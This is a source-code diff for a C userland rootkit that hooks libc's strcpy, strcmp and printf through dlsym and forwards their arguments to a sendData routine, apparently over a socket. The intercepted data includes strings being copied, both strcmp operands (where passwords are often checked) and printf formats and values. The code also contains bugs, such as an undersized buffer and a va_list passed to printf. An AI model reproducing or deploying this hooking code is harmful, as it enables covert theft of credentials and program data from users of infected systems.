@@ -1,8 +1,8 @@
 #include "Rootkit.h"
-#include <stdarg.h>
 #include <dlfcn.h>
 #include <stdarg.h>
 #include <stdlib.h>
+#include <stdio.h>
 #include <sys/socket.h>
 #include <string.h>
 #include <arpa/inet.h>
@@ -66,30 +66,35 @@ void copy(char* destination, const char* source){
 }
 
 char* strcpy(char* destination, const char* source){
-    copy(destination, source);
+    // copy original strcpy
+    char* (*func)(char* destination, const char* source) = 
+        dlsym(
+            dlopen(LIBC, RTLD_NOW),
+            "strcpy");
 
-    sendData("strcpy", 1);
-    sendData("destination: ", 0);
+    char* result = func(destination, source);
+
+    sendData("strcpy ", 1);
+    sendData("\tdestination: ", 0);
     sendData(destination, 1);
 
-    return destination;
+    return result;
 }
 
 int strcmp(const char *str1, const char *str2){
+    // copy original strcmp
+    int (*func)(const char *str1, const char *str2) = 
+        dlsym(
+            dlopen(LIBC, RTLD_NOW),
+            "strcmp");
+    
     sendData("strcmp", 1);
-    sendData("Str1: ", 0);
+    sendData("\tStr1: ", 0);
     sendData(str1, 1);
-    sendData("Str2: ", 0);
+    sendData("\tStr2: ", 0);
     sendData(str2, 1);
 
-    while (*str1) {
-        if (*str1 != *str2) {
-            break;
-        }
-        str1++;
-        str2++;
-    }
-    return *str1 - *str2;
+    return func(str1, str2);
 }
 
 int putchar(int ch){
@@ -107,7 +112,6 @@ int puts(const char *str){
 }
 
 int printf(const char *format, ...){
-
     // copy original printf
     int (*func)(const char *format, ...) = 
         dlsym(
@@ -115,16 +119,22 @@ int printf(const char *format, ...){
             "printf");
 
     // send
+    sendData("Format: ", 0);
     sendData(format, 1);
 
-    // get count of arguments in printf
+    // get count of arguments in printf and argument types
     int count = 0;
+    char* types = malloc(strlen(format));
     char ch = format[count];
     for (int i = 0; ch != '\0'; i++) {
-        if(format[i] == '%')
-            count++;
+        if(format[i] == '%'){
+            types[count++] = format[i + 1];
+            types[count] = '\0';
+        }
         ch = format[i];
     }
+    
+    sendData(types, 1);
 
     va_list arg;
     va_start(arg, format);
@@ -132,13 +142,41 @@ int printf(const char *format, ...){
     // call orginal function
     int result = func(format, arg);
 
-    // iterate through arguments
-    for (int i = 0; i < count; i++) {
-        sendData("Argument --- ", 0);
-        sendData(va_arg(arg, const char*), 1);
-    }
+    // process arguments
+    processprintfargs(types, count, arg);
 
     va_end(arg);
 
     return result;
+}
+
+void processprintfargs(char *types, int count, va_list arg){
+    // iterate through arguments
+    for (int i = 0; i < count; i++) {
+        sendData("\n\tArgument --- ", 0);
+        switch (types[i]) {
+            case 'i':
+                sendData("\n\tinterger: \t", 0);
+
+                char* tempStr = malloc(1024);
+                int tempInt = 0;
+                // get int arguemetn
+                tempInt = va_arg(arg, int);
+                
+                // create string from integer
+                sprintf(tempStr, "%i", tempInt);
+
+                // print to standard out
+                puts(tempStr);
+
+                free(tempStr);
+                break;
+            case 's':
+                sendData("\n\tstring: \t", 0);
+                puts(va_arg(arg, const char*));
+                break;
+            default:
+                break;
+        }
+    }
 }
